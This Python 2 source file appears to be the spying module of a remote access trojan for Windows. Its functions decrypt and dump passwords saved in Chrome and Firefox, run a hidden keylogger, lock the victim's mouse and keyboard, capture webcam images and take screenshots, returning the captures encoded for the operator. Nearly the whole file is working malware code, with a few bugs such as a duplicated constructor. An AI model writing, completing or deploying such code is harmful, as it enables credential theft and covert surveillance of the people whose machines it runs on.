import os
import sqlite3
import win32crypt
import sys
from sys import stdout as out
from sys import stderr as err
import json
from ConfigParser import ConfigParser
from base64 import b64decode
from os import path
from ctypes import c_uint, c_void_p, c_char_p, cast, byref, string_at
from ctypes import Structure, CDLL
from getpass import getpass

import pyHook
import pythoncom
import win32api
import win32con
import logging
from common import *

class Information_Gathering:
	"""
	Functions related to gathering data from the system.
	"""
	def __init__(self):
		self.shell = None
		
	def __init__(self):
		self.keylog_thread = None
		self.mouselock = None
		self.keylock = None
		self.key_log = ""
		
	@windows_only
	def dump_chrome():
		info_list = []
		path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
		original_dir = os.getcwd()
		try:
			os.chdir(path)
		except:
			os.chdir(original_dir)
			return("[-]Chrome is not installed.")
		try:
			connection = sqlite3.connect("Login Data")
			with connection:
				cursor = connection.cursor()
				v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
				value = v.fetchall()
			for information in value:
				if os.name == 'nt':
					password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
					if password:
						info_list.append({
							'origin_url': information[0],
							'username': information[1],
							'password': str(password)
						})
			output = ""
			for val in info_list:
				for key in val:
					if key == "origin_url":
						wsite = val[key]
					elif key == "username":
						uname = val[key]
					elif key == "password":
						pword = val[key]
				formatted = "Website:  "+wsite+"\nUsername: "+uname+"\nPassword: "+pword+"\n\n"
				output += str(formatted)

		except sqlite3.OperationalError, e:
			os.chdir(original_dir)
			e = str(e)
			if (e == 'database is locked'):
				return "[-]Database is locked. Is Chrome running?"
			elif (e == 'no such table: logins'):
				return "[-]Logins table is not present in the database."
			elif (e == 'unable to open database file'):
				return "[-]Database file does not exist."
			else:
				return "[-]Unknown error"
		
		os.chdir(original_dir)
		return output
		
		
	@windows_only
	def dump_firefox(): 
		class NotFoundError(Exception):
			pass
		 
		 
		class Item(Structure):
			_fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)]
		 
		 
		class Credentials(object):
			def __init__(self, db):
				self.db = db
		 
				if not path.isfile(db):
					raise NotFoundError("Error - {0} database not found\n".format(db))
		 
			def __iter__(self):
				pass
		 
			def done(self):
				pass
		 
		 
		class SqliteCredentials(Credentials):
			def __init__(self, profile):
				db = profile + "/signons.sqlite"
		 
				super(SqliteCredentials, self).__init__(db)
		 
				self.conn = sqlite3.connect(db)
				self.c = self.conn.cursor()
		 
			def __iter__(self):
				self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType "
							   "FROM moz_logins")
				for i in self.c:
					# yields hostname, encryptedUsername, encryptedPassword, encType
					yield i
		 
			def done(self):
				super(SqliteCredentials, self).done()
		 
				self.c.close()
				self.conn.close()
		 
		 
		class JsonCredentials(Credentials):
			def __init__(self, profile):
				db = profile + "/logins.json"
		 
				super(JsonCredentials, self).__init__(db)
		 
			def __iter__(self):
				with open(self.db) as fh:
					data = json.load(fh)
		 
					try:
						logins = data["logins"]
					except:
						raise Exception("Unrecognized format in {0}".format(self.db))
		 
					for i in logins:
						# yields hostname, encryptedUsername, encryptedPassword
						yield (i["hostname"], i["encryptedUsername"],
							   i["encryptedPassword"], i["encType"])
		 
		 
		def handle_error():
			pass
		 
		 
		def decrypt_passwords(profile, password, libnss):
			"""
			Decrypt requested profile using the provided password and print out all
			stored passwords.
			"""
		 
			if libnss.NSS_Init(profile) != 0:
				return "[-]Error initializing libnss."
		 
			if password:
				password = c_char_p(password)
				keyslot = libnss.PK11_GetInternalKeySlot()
				if keyslot is None:
					return "[-]Bad libnss key slot."
		 
				if libnss.PK11_CheckUserPassword(keyslot, password) != 0:
					return "[-]Bad master password."
			else:
				pass
		 
			username = Item()
			passwd = Item()
			outuser = Item()
			outpass = Item()
		 
			# Any password in this profile store at all?
			got_password = False
		 
			try:
				credentials = JsonCredentials(profile)
			except NotFoundError:
				try:
					credentials = SqliteCredentials(profile)
				except NotFoundError:
					return "[-]Bit of a fuck-up here"
					
			output = ""
			for host, user, passw, enctype in credentials:
				#if not output: output = ""
				got_password = True
		 
				if enctype:
					username.data = cast(c_char_p(b64decode(user)), c_void_p)
					username.len = len(b64decode(user))
					passwd.data = cast(c_char_p(b64decode(passw)), c_void_p)
					passwd.len = len(b64decode(passw))
		 
					if libnss.PK11SDR_Decrypt(byref(username), byref(outuser), None) == -1:
						return("[-]Databse is protected by a master password.")
		 
					if libnss.PK11SDR_Decrypt(byref(passwd), byref(outpass), None) == -1:
						return("[-]Bad master password.")
		 
					output += "Website:  {0}\n".format(host.encode("utf-8"))
					output += "Username: {0}\n".format(string_at(outuser.data,
																   outuser.len))
					output += "Password: {0}\n\n".format(string_at(outpass.data,
																	 outpass.len))
				else:
					output += "Website:  {0}\n".format(host.encode("utf-8"))
					output += "Username: {0}\n".format(user)
					output += "Password: {0}\n\n".format(passw)
		 
			credentials.done()
			libnss.NSS_Shutdown()
		 
			if not got_password:
				return "No passwords stored in database."
		 
			return output
		 
		 
		def ask_section(profiles):
			"""
			Prompt the user which profile should be used for decryption
			"""
			sections = {}
			i = 1
			for section in profiles.sections():
				if section.startswith("Profile"):
					sections[str(i)] = profiles.get(section, "Path")
				else:
					continue
				i += 1
			return sections['1']
		 
		def main():
			 
			firefox = ""
		 
			if os.name == "nt":
				nssname = "nss3.dll"
				firefox = r"c:\Program Files (x86)\Mozilla Firefox"
				os.environ["PATH"] = ';'.join([os.environ["PATH"], firefox])
		 
			else:
				nssname = "libnss3.so"
		 
			try:
				libnss = CDLL(os.path.join(firefox, nssname))
		 
			except Exception as e:
				return "[-]Could not load libnss3: "+str(e)
		 
			profile_path = "~\\AppData\\Roaming\\Mozilla\\Firefox"
		 
			basepath = path.expanduser(profile_path)
			profileini = os.path.join(basepath, "profiles.ini")
		 
			if not os.path.isfile(profileini):
				return "[-]profiles.ini does not exist."
		 
			# Read profiles from Firefox profile folder
			profiles = ConfigParser()
			profiles.read(profileini)
		 
			# Ask user which profile want's to open
			section = ask_section(profiles)
		 
			# Prompt for Master Password
			profile = os.path.join(basepath, section)
		 
			# And finally decode all passwords
			output = decrypt_passwords(profile, "", libnss)
			return(output)
			
		return main()
		
	@windows_only
	def keylog_start(self):
		def keypress(event):
			if event.Ascii == 13:
				self.key_log += "[RETURN]"
			elif event.Ascii == 9:
				self.key_log += "[TAB]"
			else:
				self.key_log += chr(event.Ascii)
			return True
			
		def pumpit_louder():
			ct = threading.currentThread()
			while not ct.stopped():
				hook = pyHook.HookManager()
				hook.KeyDown = keypress
				hook.HookKeyboard()
				pythoncom.PumpMessages()
				
			hook.UnhookKeyboard()
		
		t = StoppableThread(target=pumpit_louder)
		t.daemon = True
		t.start()
		
		self.keylog_thread = t
		
		return "[+] Logging started."
		
	@windows_only
	def keylog_stop(self):
		self.keylog_thread.stop()
		win32api.PostThreadMessage(self.keylog_thread.ident, win32con.WM_QUIT, 0, 0) # pythoncom.PumpMessages() stops when it gets a WM_QUIT message.
		return "[+] Logging stopped."
		
	@windows_only
	def keylog_dump(self):
		log = self.key_log
		self.key_log = ""
		return log
		
	@windows_only
	def lock_mouse(self):
		def DENIED(event): return False
		
		def pumper():
			ct = threading.currentThread()
			while not ct.stopped():
				hook = pyHook.HookManager()
				hook.MouseAll = DENIED
				hook.HookMouse()
				pythoncom.PumpMessages()
				
			hook.UnhookMouse()
				
		t = StoppableThread(target=pumper)
		t.daemon = True
		t.start()	

		self.mouselock = t
		
	def unlock_mouse(self):
		self.mouselock.stop()
		win32api.PostThreadMessage(self.mouselock.ident, win32con.WM_QUIT, 0, 0)
		
	@windows_only
	def lock_keyboard(self):
		def DENIED(event): return False
		
		def pumper():
			ct = threading.currentThread()
			while not ct.stopped():
				hook = pyHook.HookManager()
				hook.KeyDown = DENIED
				hook.HookKeyboard()
				pythoncom.PumpMessages()
				
			hook.UnhookKeyboard()
				
		t = StoppableThread(target=pumper)
		t.daemon = True
		t.start()	

		self.keylock = t
		
	def unlock_keyboard(self):
		self.mouselock.stop()
		win32api.PostThreadMessage(self.keylock.ident, win32con.WM_QUIT, 0, 0)
		
	@windows_only
	def uictl(self, a):
		action, what = a.split()
		what = what.lower()
		action = action.lower()
		if what not in ["keyboard","mouse"]: return "[-]Unknown object: "+what
		if action == "disable":
			if what == "mouse":
				self.lock_mouse()
			elif what == "keyboard":
				self.lock_keyboard()

				
		elif action == "enable":
			if what == "mouse":
				self.unlock_mouse()
			elif what == "keyboard":
				self.unlock_keyboard()
				
		else:
			return "[-]Unknown action: "+action
				
		return "[+]"+what.capitalize()+" "+action+"d."
		
	@windows_only
	def webcam_list(self):
		num = 0
		cams = "Available cameras:"
		while True:
			try:
				cam = vidcap.new_Dev(num, 0)
				cams += "\n["+str(num)+"] "+cam.getdisplayname()
			except Exception as e:
				break
			num += 1
			
		return cams
		
	@windows_only
	def webcam_snap(self, id):
		try:
			cam = vidcap.new_Dev(int(id), 0)
		except:
			return "[-] No such camera found: "+str(id)
			
		time.sleep(2) # So camera has time to adjust focus, brightness, etc.
		
		buffer, width, height = cam.getbuffer()
		return base64.b64encode(buffer)+"|"+str(width)+"|"+str(height)+"|"
		
	@windows_only
	def take_screenshot(self):
		try:
			img = pyscreenshot.grab(childprocess=False)
			img_data = img.tobytes()
			width, height = img.size
			
			return base64.b64encode(img_data)+"|"+str(width)+"|"+str(height)+"|"
		except Exception as e:
			return "A|1|1|"
		
info = Information_Gathering()